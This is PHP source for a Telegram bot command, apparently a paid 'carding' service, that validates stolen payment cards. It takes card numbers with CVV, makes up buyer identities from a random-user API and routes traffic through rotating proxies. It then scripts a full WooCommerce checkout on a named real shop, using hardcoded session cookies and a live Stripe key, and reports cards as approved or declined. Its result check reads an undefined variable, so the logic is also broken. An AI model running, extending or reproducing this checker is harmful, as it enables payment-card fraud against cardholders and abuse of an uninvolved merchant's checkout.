<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}

if((strpos($text, '/str') === 0) or (strpos($text, '.str') === 0) or ((strpos($text, '$str') === 0) or (strpos($text, '!str') === 0)) or ((strpos($text, '+str') === 0) or (strpos($text, '#str') === 0)) or (strpos($text, '?str') === 0)) {

 $userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}   


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Stripe 1 USD</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}

$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}


  

$start_time = microtime(true);
  
$messageidtoeditx = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtostr = capture(json_encode($messageidtoeditx), '"message_id":', ',');
        
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');

  
$last4 = substr($cc, -4);


//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}
  
//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Stripe+Woocomm
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  
  
  
  
  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();  
  
  
#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];
 


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
  
//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Stripe+Woocomm
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//==================[BIN LOOK-UP]======================//
  $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//



 
 bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Stripe+Woocomm
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.mosingers.com/product/amazing-grace/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.mosingers.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Content-Type: multipart/form-data; boundary=----'.$web.'';
$headers[] = 'Path: /product/amazing-grace/';
$headers[] = 'Cookie: __cf_bm=bJoTIqNuVolxu_v6xjTkvHQXWiC05F.0vXb5g6af1PM-1694327676-0-AUeQppIBTODyL1Ctk+pOryFPYWRYWHo1Z938zRXTejmFLJ1CB81ibAn+O9gdKMUBYmegJZkow6+NID9jjHTTnFM=; __stripe_mid=e0dfbac1-874b-469d-8c1b-9058c6283fa2549c2f; __stripe_sid=540377bb-9abe-40ff-b192-287b1a751c3f829e79';
$headers[] = 'Origin: https://www.mosingers.com';
$headers[] = 'Referer: https://www.mosingers.com/product/amazing-grace/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
//$headers[] = 'X-Requested-With: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------'.$web.'
Content-Disposition: form-data; name="quantity"

1
------'.$web.'
Content-Disposition: form-data; name="add-to-cart"

2951
------'.$web.'
Content-Disposition: form-data; name="ak_bib"


------'.$web.'
Content-Disposition: form-data; name="ak_bfs"

1694327712084
------'.$web.'
Content-Disposition: form-data; name="ak_bkpc"

0
------'.$web.'
Content-Disposition: form-data; name="ak_bkp"


------'.$web.'
Content-Disposition: form-data; name="ak_bmc"

2;
------'.$web.'
Content-Disposition: form-data; name="ak_bmcc"

1
------'.$web.'
Content-Disposition: form-data; name="ak_bmk"


------'.$web.'
Content-Disposition: form-data; name="ak_bck"


------'.$web.'
Content-Disposition: form-data; name="ak_bmmc"

0
------'.$web.'
Content-Disposition: form-data; name="ak_btmc"

3
------'.$web.'
Content-Disposition: form-data; name="ak_bsc"

2
------'.$web.'
Content-Disposition: form-data; name="ak_bte"

143;334,140;280,550;248,901;26,4875;
------'.$web.'
Content-Disposition: form-data; name="ak_btec"

5
------'.$web.'
Content-Disposition: form-data; name="ak_bmm"


------'.$web.'--

');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result = curl_exec($ch);

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.mosingers.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.mosingers.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Path: /checkout/';
$headers[] = 'Cookie: __cf_bm=bJoTIqNuVolxu_v6xjTkvHQXWiC05F.0vXb5g6af1PM-1694327676-0-AUeQppIBTODyL1Ctk+pOryFPYWRYWHo1Z938zRXTejmFLJ1CB81ibAn+O9gdKMUBYmegJZkow6+NID9jjHTTnFM=; __stripe_mid=e0dfbac1-874b-469d-8c1b-9058c6283fa2549c2f; __stripe_sid=540377bb-9abe-40ff-b192-287b1a751c3f829e79; woocommerce_items_in_cart=1; wp_woocommerce_session_a799ad4d0f5b76f83f90f44995e8c26e=t_7c47a7142ef0d97339dcd9901dc1bb%7C%7C1694500520%7C%7C1694496920%7C%7Cb63571ab6bf3b30bfe907a670f78ae33; woocommerce_cart_hash=8b0d9c79fadce1a51d00b42f2047c75a';
$headers[] = 'Referer: https://www.mosingers.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$nonce = '/name="woocommerce-process-checkout-nonce" value="([^"]+)"/';


if (preg_match($nonce, $result1, $matches)) {
    $nonce_value = $matches[1];
    //echo "Nonce value: " . $nonce_value;
} else {
    //echo "Nonce value not found.";
}

//=======================[5 REQ]==================================//


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[address][line1]=5th+Ave&billing_details[address][state]=NY&billing_details[address][city]=New+York&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[email]='.$email.'&billing_details[phone]=09235623261&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e6ea0eff-af9a-40b8-8f4a-96e569510e8e12e394&muid=e0dfbac1-874b-469d-8c1b-9058c6283fa2549c2f&sid=540377bb-9abe-40ff-b192-287b1a751c3f829e79&pasted_fields=number&payment_user_agent=stripe.js%2Fe13471f934%3B+stripe-js-v3%2Fe13471f934%3B+card-element&time_on_page=13225&key=pk_live_oaFnLCWuUEv7NsTlypcYbPtZ00RQkAtBGp
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$id = trim(strip_tags(getStr($result3, '"id": "','"')));
$dcode = trim(strip_tags(getStr($result3, '"code": "','"')));
$dmsg = trim(strip_tags(getStr($result3, '"message": "','"')));


bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Stripe+Woocomm
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.mosingers.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.mosingers.com';
$headers[] = 'path: /?wc-ajax=checkout';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.8';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: __cf_bm=bJoTIqNuVolxu_v6xjTkvHQXWiC05F.0vXb5g6af1PM-1694327676-0-AUeQppIBTODyL1Ctk+pOryFPYWRYWHo1Z938zRXTejmFLJ1CB81ibAn+O9gdKMUBYmegJZkow6+NID9jjHTTnFM=; __stripe_mid=e0dfbac1-874b-469d-8c1b-9058c6283fa2549c2f; __stripe_sid=540377bb-9abe-40ff-b192-287b1a751c3f829e79; woocommerce_items_in_cart=1; wp_woocommerce_session_a799ad4d0f5b76f83f90f44995e8c26e=t_7c47a7142ef0d97339dcd9901dc1bb%7C%7C1694500520%7C%7C1694496920%7C%7Cb63571ab6bf3b30bfe907a670f78ae33; woocommerce_cart_hash=8b0d9c79fadce1a51d00b42f2047c75a';
$headers[] = 'origin: https://www.mosingers.com';
$headers[] = 'referer: https://www.mosingers.com/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$firstname.'&billing_last_name='.$lastname.'&billing_company=&billing_country=US&billing_address_1=5th+Ave&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=09235623261&billing_email='.$email.'&ship_to_different_address=1&shipping_first_name='.$firstname.'&shipping_last_name='.$lastname.'&shipping_company=&shipping_country=US&shipping_address_1=5th+Ave&shipping_address_2=&shipping_city=New+York&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=legacy_flat_rate&payment_method=stripe&woocommerce-process-checkout-nonce='.$nonce_value.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id.'
');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);
$jsonResponse2 = json_decode($result5, true);
$msg = trim(strip_tags($jsonResponse2['messages']));



//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Stripe+Woocomm
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if (
    strpos($result2, 'Thank you for your order.') !== false ||
    strpos($result2, 'Membership confirmed.') !== false ||
    strpos($result2, '"result":"success"') !== false ||
    strpos($result2, 'Thank You For Donation.') !== false ||
    strpos($result2, 'incorrect_zip') !== false ||
    strpos($result2, 'Order placed') !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, '/donations/thank_you?donation_number=') !== false
) {

$status = ("Approved ✅");  
$respo = ("Order placed");
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {
$status = ("Approved ✅");  
$respo = ("Insufficient Funds");
}
elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
$status = ("Approved ✅");  
$respo = ("Incorrect cvc");
}
elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$status = ("Approved ✅");  
$respo = ("Transaction Not Allowed");
}
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$status = ("Approved ✅");  
$respo = ("3d2s_fingerprint");
}


else {
$status = ("Decline ❌");  
$respo = ("$msg $dcode");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
               'message_id'=>$messageidtostr,
'text'=>"<b>
Stripe+Woocomm 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $respo

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
recordBotResponseTimestamp($userId);
}else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtostr,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            
        ]);

}
